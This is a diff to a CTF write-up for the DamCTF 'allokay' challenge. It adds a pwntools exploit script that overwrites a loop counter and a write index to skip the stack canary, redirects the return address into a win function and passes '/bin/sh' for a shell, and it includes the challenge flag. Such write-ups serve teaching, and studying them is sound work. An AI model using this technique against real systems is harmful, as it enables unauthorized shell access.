@@ -15,4 +15,49 @@
 
 #### Since we will pass the string as an argument, it would be on the stack. Thus I decided to jump after `win`'s function prologue to not mess up the stack. After we have placed the values that we need, we can continue providing values until such condition that the loop terminates and returns. Might be a complicated process but it got me a shell nonetheless. 
 
+```python
+from pwn import *
+
+#:
+#p = process('./allokay')
+p = remote('chals.damctf.xyz' ,32575)
+#gdb.attach(p.pid, 'break *get_input + 194')
+print(p.recv())
+
+p.sendline('100A/bin/sh\x00')
+print(p.recvuntil('numbers!\n'))
+
+for i in range(17):
+	print(p.recvuntil(': '))
+	p.sendline(str(i))
+
+print(p.recvuntil(': '))
+p.sendline('128849018880') #: overwrite the number of items that we read in (change from 100 to 30)
+print(p.recvuntil(': '))
+p.sendline('18') 
+print(p.recvuntil(': '))
+p.sendline('94489280512') #: overwrite the index to where the next input will be written to (this skips over the canary and places the value into the return address)
+print(p.recvuntil(': '))
+p.sendline('4196211') #: jump in the middle of the win function, didn't want the prologue to be included since I didn't want to mess up the stack
+print(p.recvuntil(': '))
+p.sendline('4919') #: skip
+print(p.recvuntil(': '))
+p.sendline(str(0x6010a0 + 4)) #: address of the /bin/sh string
+print(p.recvuntil(': '))
+p.sendline('4919') #: just continue writing until we reach 30
+print(p.recvuntil(': '))
+p.sendline('4919')
+print(p.recvuntil(': '))
+p.sendline('4919')
+print(p.recvuntil(': '))
+
+p.interactive()
+
+#: 128 849 018 880 <- 17/100
+#: 944 892 805 12 <- 19/100
+#: 419 621 1 <- middle of win
+#: 0x6010a0 <- buffer
+#: 322 376 503 <- 0x13371337
+#: dam{4Re_u_A11_0cK4y}
+```
 ![](shell.png)
